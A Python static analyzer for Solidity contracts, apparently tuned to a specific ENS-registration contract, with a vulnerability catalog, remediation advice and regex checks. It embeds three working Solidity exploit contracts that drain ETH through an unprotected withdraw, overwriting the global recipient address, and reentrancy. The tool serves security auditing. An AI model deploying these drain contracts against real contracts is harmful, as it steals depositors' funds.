"""
Solidity Smart Contract Vulnerability Analyzer

Static analysis engine for Solidity source code. Detects common vulnerability
classes including access control flaws, reentrancy, fund-theft patterns,
and architectural issues.

FOR AUTHORIZED SECURITY RESEARCH AND BUG BOUNTY USE ONLY.
"""

import re
import urllib.request
import json
from dataclasses import dataclass, field
from typing import Optional


# ── Vulnerability catalog ──────────────────────────────────────────────────────

VULN_CATALOG = {
    "unprotected_withdraw": {
        "title": "Unprotected withdraw() — zero access control",
        "severity": "CRITICAL",
        "cwe": "CWE-284",
        "swc": "SWC-105",
        "description": (
            "The withdraw() function has no access control. Any external address "
            "can call it and drain the entire contract balance."
        ),
        "remediation": (
            "Add require(msg.sender == owner, 'Not owner') or use OpenZeppelin "
            "Ownable. Pattern: modifier onlyOwner { require(msg.sender == owner); _; }"
        ),
    },
    "global_adr_overwrite": {
        "title": "Fund theft via global address overwrite",
        "severity": "CRITICAL",
        "cwe": "CWE-840",
        "swc": "SWC-124",
        "description": (
            "A single global address variable (e.g. `adr`) is overwritten on every "
            "call to the registration function. The last caller becomes the sole "
            "withdrawal recipient, stealing all previously deposited ETH."
        ),
        "remediation": (
            "Use per-user mappings: mapping(address => uint) public balances. "
            "Allow only msg.sender to withdraw their own balance (pull-payment pattern)."
        ),
    },
    "reentrancy": {
        "title": "Reentrancy — .call{value:} without guard or CEI pattern",
        "severity": "HIGH",
        "cwe": "CWE-841",
        "swc": "SWC-107",
        "description": (
            "Uses low-level .call{value:...}('') without a reentrancy guard and "
            "does not clear state before the external call (violates Checks-Effects-"
            "Interactions). A malicious receiver contract can re-enter withdraw()."
        ),
        "remediation": (
            "1. Zero out state before the .call: uint amt = balance; balance = 0; "
            "(bool ok,) = payable(to).call{value: amt}(''); require(ok);\n"
            "2. Or use OpenZeppelin ReentrancyGuard nonReentrant modifier."
        ),
    },
    "frontrun_registration": {
        "title": "Front-running: registration + instant withdraw",
        "severity": "HIGH",
        "cwe": "CWE-362",
        "swc": "SWC-114",
        "description": (
            "Any pending registration transaction is visible in the mempool. An "
            "attacker can front-run by submitting the same registration with higher "
            "gas, become `adr`, then call withdraw() to drain all ETH including "
            "the victim's just-deposited value."
        ),
        "remediation": (
            "Use a commit-reveal scheme for registration. Alternatively, combine "
            "with per-user pull-payment so only depositors can withdraw their own funds."
        ),
    },
    "singleton_state": {
        "title": "Singleton global state — no per-domain ownership",
        "severity": "MEDIUM",
        "cwe": "CWE-459",
        "swc": "SWC-124",
        "description": (
            "State variables ens, adr, price, data are single global slots. Every "
            "new registration overwrites all prior state. The contract cannot track "
            "more than one domain registration at a time."
        ),
        "remediation": (
            "Replace globals with a struct+mapping: "
            "struct Domain { address owner; uint price; uint registered; } "
            "mapping(string => Domain) public domains;"
        ),
    },
    "missing_events": {
        "title": "Missing event emissions",
        "severity": "MEDIUM",
        "cwe": "CWE-778",
        "swc": "SWC-120",
        "description": (
            "No events are emitted for register or withdraw operations. Off-chain "
            "indexers, front-ends, and audit trails cannot track state changes."
        ),
        "remediation": (
            "Add: event Registered(address indexed owner, string ens, uint value, uint timestamp);\n"
            "     event Withdrawn(address indexed to, uint amount);\n"
            "Emit them in ensDomen() and withdraw()."
        ),
    },
    "public_victim_address": {
        "title": "Public exposure of current fund recipient",
        "severity": "LOW",
        "cwe": "CWE-200",
        "swc": "SWC-136",
        "description": (
            "`address public adr` is permanently readable on-chain. Any attacker "
            "can watch for a high-value registration then target `adr` for social "
            "engineering, phishing, or timing the drain."
        ),
        "remediation": (
            "Use internal or private visibility where on-chain transparency is not required."
        ),
    },
    "no_domain_validation": {
        "title": "No input validation on domain name",
        "severity": "LOW",
        "cwe": "CWE-20",
        "swc": "SWC-103",
        "description": (
            "Empty strings and duplicate domain names are accepted without error. "
            "Enables namespace griefing, squatting, and silent overwrites."
        ),
        "remediation": (
            "Add: require(bytes(_ens).length > 0 && bytes(_ens).length <= 255, 'Invalid ENS');\n"
            "     require(addrEns[_ens] == address(0), 'Domain taken');"
        ),
    },
    "floating_pragma": {
        "title": "Floating compiler pragma",
        "severity": "INFO",
        "cwe": "CWE-1104",
        "swc": "SWC-103",
        "description": (
            "pragma solidity ^0.8.0 allows compilation with any 0.8.x version. "
            "Future compiler versions may introduce breaking changes or different "
            "default behavior."
        ),
        "remediation": "Pin to a specific version: pragma solidity 0.8.19;",
    },
    "naming_convention": {
        "title": "Non-standard function naming (PascalCase)",
        "severity": "INFO",
        "cwe": "CWE-1078",
        "swc": None,
        "description": (
            "Function `Reverss` uses PascalCase (reserved for contracts/events per "
            "Solidity style guide) and contains a typo. External callers may be confused."
        ),
        "remediation": "Rename to reverseResolve(string memory _ens) for clarity.",
    },
}


# ── Exploit PoC templates ──────────────────────────────────────────────────────

POC_TEMPLATES = {
    "unprotected_withdraw": """\
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEns {
    function withdraw() external;
}

contract AttackWithdraw {
    IEns public target;

    constructor(address _target) {
        target = IEns(_target);
    }

    // Step 1: call drain() — no registration needed
    function drain() external {
        target.withdraw();  // zero access control — succeeds for ANY caller
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}""",

    "global_adr_overwrite": """\
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEns {
    function ensDomen(string memory _ens) external payable;
    function withdraw() external;
}

contract AttackOverwrite {
    IEns public target;

    constructor(address _target) {
        target = IEns(_target);
    }

    // Step 1: register ANY name with 0 wei — overwrites `adr` to this contract
    // Step 2: withdraw() sends entire balance (all victim deposits) to us
    function steal() external {
        target.ensDomen{value: 0}("attacker.eth");  // adr = address(this)
        target.withdraw();                           // drains all ETH
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}""",

    "reentrancy": """\
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEns {
    function ensDomen(string memory _ens) external payable;
    function withdraw() external;
}

contract AttackReentrancy {
    IEns public target;
    uint public attackCount;

    constructor(address _target) { target = IEns(_target); }

    function attack() external payable {
        // Become adr first
        target.ensDomen{value: msg.value}("reentrant.eth");
        target.withdraw();
    }

    // Re-enter withdraw() up to 3 times while balance remains
    receive() external payable {
        if (attackCount < 3 && address(target).balance > 0) {
            attackCount++;
            target.withdraw();
        }
    }
}""",
}


# ── Detection rules ────────────────────────────────────────────────────────────

@dataclass
class Finding:
    vuln_id: str
    title: str
    severity: str
    cwe: str
    swc: Optional[str]
    description: str
    remediation: str
    file: str
    line: int
    code_snippet: str
    exploit_poc: Optional[str] = None
    feasibility: int = 5

    def to_dict(self) -> dict:
        return {
            "type": "solidity_vuln",
            "vuln_id": self.vuln_id,
            "title": self.title,
            "severity": self.severity,
            "cwe": self.cwe,
            "swc": self.swc or "N/A",
            "description": self.description,
            "remediation": self.remediation,
            "file": self.file,
            "line": self.line,
            "code_snippet": self.code_snippet,
            "exploit_poc": self.exploit_poc,
            "feasibility": self.feasibility,
        }


def _lines(src: str) -> list[str]:
    return src.splitlines()


def _snippet(lines: list[str], idx: int, context: int = 2) -> str:
    start = max(0, idx - context)
    end = min(len(lines), idx + context + 1)
    return "\n".join(
        f"{'→' if i == idx else ' '} {i+1:4d} | {lines[i]}"
        for i in range(start, end)
    )


def _find_line(lines: list[str], pattern: re.Pattern) -> int:
    for i, ln in enumerate(lines):
        if pattern.search(ln):
            return i
    return 0


# ── Analyzer class ─────────────────────────────────────────────────────────────

class SolidityAnalyzer:
    """Pattern-based static analyzer for Solidity smart contracts."""

    def __init__(self):
        self.findings: list[Finding] = []

    def analyze(self, source: str, file_path: str = "contract.sol") -> list[Finding]:
        self.findings = []
        lines = _lines(source)
        src_lower = source.lower()

        self._check_unprotected_withdraw(source, lines, file_path)
        self._check_global_adr_overwrite(source, lines, file_path)
        self._check_reentrancy(source, lines, file_path)
        self._check_frontrun(source, lines, file_path)
        self._check_singleton_state(source, lines, file_path)
        self._check_missing_events(source, lines, file_path)
        self._check_public_victim_address(source, lines, file_path)
        self._check_no_domain_validation(source, lines, file_path)
        self._check_floating_pragma(source, lines, file_path)
        self._check_naming_convention(source, lines, file_path)

        # Sort: CRITICAL first
        order = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
        self.findings.sort(key=lambda f: order.index(f.severity))
        return self.findings

    # ── Individual checks ──────────────────────────────────────────────────────

    def _check_unprotected_withdraw(self, src, lines, fp):
        pat = re.compile(r'function\s+withdraw\s*\(', re.I)
        idx = _find_line(lines, pat)
        if not pat.search(src):
            return
        window = "\n".join(lines[max(0, idx-3):idx+8])
        # Access control patterns — require(success) is NOT an access guard
        has_guard = (
            "onlyOwner" in window
            or "Ownable" in window
            or re.search(r'modifier\s+\w+', window)
            or re.search(r'require\s*\(\s*msg\.sender', window)
            or re.search(r'require\s*\(\s*\w+\s*==\s*(owner|adr|admin)', window)
        )
        if not has_guard:
            c = VULN_CATALOG["unprotected_withdraw"]
            self.findings.append(Finding(
                vuln_id="CRITICAL-1", title=c["title"], severity=c["severity"],
                cwe=c["cwe"], swc=c["swc"], description=c["description"],
                remediation=c["remediation"], file=fp, line=idx + 1,
                code_snippet=_snippet(lines, idx),
                exploit_poc=POC_TEMPLATES["unprotected_withdraw"],
                feasibility=10,
            ))

    def _check_global_adr_overwrite(self, src, lines, fp):
        global_adr = re.compile(r'^\s*address\s+public\s+\w+\s*;', re.M)
        assign_in_fn = re.compile(r'\badr\s*=\s*address\s*\(\s*msg\.sender\s*\)', re.I)
        if not (global_adr.search(src) and assign_in_fn.search(src)):
            return
        idx = _find_line(lines, assign_in_fn)
        c = VULN_CATALOG["global_adr_overwrite"]
        self.findings.append(Finding(
            vuln_id="CRITICAL-2", title=c["title"], severity=c["severity"],
            cwe=c["cwe"], swc=c["swc"], description=c["description"],
            remediation=c["remediation"], file=fp, line=idx + 1,
            code_snippet=_snippet(lines, idx),
            exploit_poc=POC_TEMPLATES["global_adr_overwrite"],
            feasibility=10,
        ))

    def _check_reentrancy(self, src, lines, fp):
        call_pat = re.compile(r'\.call\s*\{[^}]*value\s*:', re.I)
        if not call_pat.search(src):
            return
        has_guard = "nonReentrant" in src or "ReentrancyGuard" in src
        idx = _find_line(lines, call_pat)
        # Check if state is cleared before the .call (CEI pattern)
        pre_window = "\n".join(lines[max(0, idx-5):idx])
        clears_state = re.search(r'\b\w+\s*=\s*0\s*;', pre_window)
        if not has_guard and not clears_state:
            c = VULN_CATALOG["reentrancy"]
            self.findings.append(Finding(
                vuln_id="HIGH-1", title=c["title"], severity=c["severity"],
                cwe=c["cwe"], swc=c["swc"], description=c["description"],
                remediation=c["remediation"], file=fp, line=idx + 1,
                code_snippet=_snippet(lines, idx),
                exploit_poc=POC_TEMPLATES["reentrancy"],
                feasibility=8,
            ))

    def _check_frontrun(self, src, lines, fp):
        has_payable_reg = re.search(r'function\s+\w+\s*\([^)]*\)\s+public\s+payable', src)
        has_withdraw = re.search(r'function\s+withdraw', src, re.I)
        has_global_adr = re.search(r'address\s+public\s+\w+\s*;', src)
        if has_payable_reg and has_withdraw and has_global_adr:
            idx = _find_line(lines, re.compile(r'function\s+\w+.*public\s+payable'))
            c = VULN_CATALOG["frontrun_registration"]
            self.findings.append(Finding(
                vuln_id="HIGH-2", title=c["title"], severity=c["severity"],
                cwe=c["cwe"], swc=c["swc"], description=c["description"],
                remediation=c["remediation"], file=fp, line=idx + 1,
                code_snippet=_snippet(lines, idx),
                feasibility=9,
            ))

    def _check_singleton_state(self, src, lines, fp):
        globals_pat = re.compile(
            r'^\s*(string|address|uint|bool)\s+public\s+\w+\s*;', re.M
        )
        matches = globals_pat.findall(src)
        # More than 2 non-mapping public globals suggests singleton pattern
        if len(matches) >= 3:
            # Confirm there's a registration function that overwrites them
            if re.search(r'=\s*(msg\.value|block\.timestamp|address\(msg\.sender\))', src):
                idx = _find_line(lines, re.compile(r'^\s*(string|address|uint)\s+public', re.M))
                c = VULN_CATALOG["singleton_state"]
                self.findings.append(Finding(
                    vuln_id="MEDIUM-1", title=c["title"], severity=c["severity"],
                    cwe=c["cwe"], swc=c["swc"], description=c["description"],
                    remediation=c["remediation"], file=fp, line=idx + 1,
                    code_snippet=_snippet(lines, idx),
                    feasibility=10,
                ))

    def _check_missing_events(self, src, lines, fp):
        has_payable = re.search(r'public\s+payable', src)
        has_events = re.search(r'\bevent\s+\w+', src)
        if has_payable and not has_events:
            idx = _find_line(lines, re.compile(r'public\s+payable'))
            c = VULN_CATALOG["missing_events"]
            self.findings.append(Finding(
                vuln_id="MEDIUM-2", title=c["title"], severity=c["severity"],
                cwe=c["cwe"], swc=c["swc"], description=c["description"],
                remediation=c["remediation"], file=fp, line=idx + 1,
                code_snippet=_snippet(lines, idx),
                feasibility=10,
            ))

    def _check_public_victim_address(self, src, lines, fp):
        pat = re.compile(r'address\s+public\s+adr\s*;')
        if pat.search(src):
            idx = _find_line(lines, pat)
            c = VULN_CATALOG["public_victim_address"]
            self.findings.append(Finding(
                vuln_id="LOW-1", title=c["title"], severity=c["severity"],
                cwe=c["cwe"], swc=c["swc"], description=c["description"],
                remediation=c["remediation"], file=fp, line=idx + 1,
                code_snippet=_snippet(lines, idx),
                feasibility=7,
            ))

    def _check_no_domain_validation(self, src, lines, fp):
        fn_pat = re.compile(r'function\s+\w+\s*\(\s*string\s+memory', re.I)
        if fn_pat.search(src):
            idx = _find_line(lines, fn_pat)
            window = "\n".join(lines[idx:idx+15])
            has_require = "require" in window and ("length" in window or "bytes(" in window)
            if not has_require:
                c = VULN_CATALOG["no_domain_validation"]
                self.findings.append(Finding(
                    vuln_id="LOW-2", title=c["title"], severity=c["severity"],
                    cwe=c["cwe"], swc=c["swc"], description=c["description"],
                    remediation=c["remediation"], file=fp, line=idx + 1,
                    code_snippet=_snippet(lines, idx),
                    feasibility=8,
                ))

    def _check_floating_pragma(self, src, lines, fp):
        pat = re.compile(r'pragma\s+solidity\s+\^')
        if pat.search(src):
            idx = _find_line(lines, pat)
            c = VULN_CATALOG["floating_pragma"]
            self.findings.append(Finding(
                vuln_id="INFO-1", title=c["title"], severity=c["severity"],
                cwe=c["cwe"], swc=c["swc"], description=c["description"],
                remediation=c["remediation"], file=fp, line=idx + 1,
                code_snippet=_snippet(lines, idx),
                feasibility=3,
            ))

    def _check_naming_convention(self, src, lines, fp):
        # PascalCase function names that aren't constructors
        pat = re.compile(r'function\s+([A-Z][a-zA-Z0-9]+)\s*\(')
        for i, ln in enumerate(lines):
            m = pat.search(ln)
            if m:
                c = VULN_CATALOG["naming_convention"]
                self.findings.append(Finding(
                    vuln_id="INFO-2", title=c["title"], severity=c["severity"],
                    cwe=c["cwe"], swc=c["swc"], description=c["description"],
                    remediation=c["remediation"], file=fp, line=i + 1,
                    code_snippet=_snippet(lines, i),
                    feasibility=2,
                ))


# ── Gist fetcher ───────────────────────────────────────────────────────────────

def fetch_gist(gist_id: str) -> dict[str, str]:
    """Fetch all files from a public GitHub Gist. Returns {filename: content}."""
    url = f"https://api.github.com/gists/{gist_id}"
    req = urllib.request.Request(url, headers={"User-Agent": "KittyPaw-Scanner/1.0"})
    with urllib.request.urlopen(req, timeout=15) as resp:
        data = json.loads(resp.read())
    return {name: f["content"] for name, f in data["files"].items()}


def analyze_gist(gist_id: str) -> list[Finding]:
    """Fetch a gist and analyze all .sol files in it."""
    files = fetch_gist(gist_id)
    analyzer = SolidityAnalyzer()
    all_findings: list[Finding] = []
    for fname, content in files.items():
        if fname.endswith(".sol"):
            all_findings.extend(analyzer.analyze(content, fname))
    return all_findings
